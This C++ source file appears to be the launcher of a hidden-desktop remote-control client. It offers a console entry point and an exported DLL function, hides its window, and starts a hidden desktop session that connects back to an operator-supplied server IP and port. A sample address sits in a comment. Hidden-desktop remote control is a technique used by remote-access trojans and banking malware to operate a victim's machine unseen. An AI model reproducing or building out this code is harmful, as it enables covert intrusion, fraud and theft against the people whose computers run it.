#include "HiddenDesktop.h"
#include <Windows.h>
#include <stdlib.h>
#include <iostream>

#define TIMEOUT INFINITE

void StartAndWait(const char* host, int port)
{
	InitApi();
	const HANDLE hThread = StartHiddenDesktop(host, port);
	WaitForSingleObject(hThread, TIMEOUT);
}

void splitIpAddressAndPort(const std::string& input, std::string& ipAddress, std::string& port) {
	// Find the position of the colon
	size_t colonPos = input.find(':');

	// Extract the IP address
	ipAddress = input.substr(0, colonPos);

	// Extract the port
	port = input.substr(colonPos + 1);
}

void __stdcall mainexport(char* ipAddress, char* port)
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	StartAndWait(ipAddress, atoi(port));
	// StartAndWait("192.168.9.11", 8080);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	// Store the module handle
	break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		// Shutdown GDI+
		break;
	}
	return TRUE;
}

#if 1
int main()
{
	int port;
	char host[128] = { 0 };

	std::cout << "[!] Server IP: ";
	std::cin >> host;

	std::cout << "[!] Server Port: ";
	std::cin >> port;

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	StartAndWait(host, port);
	return 0;
}
#endif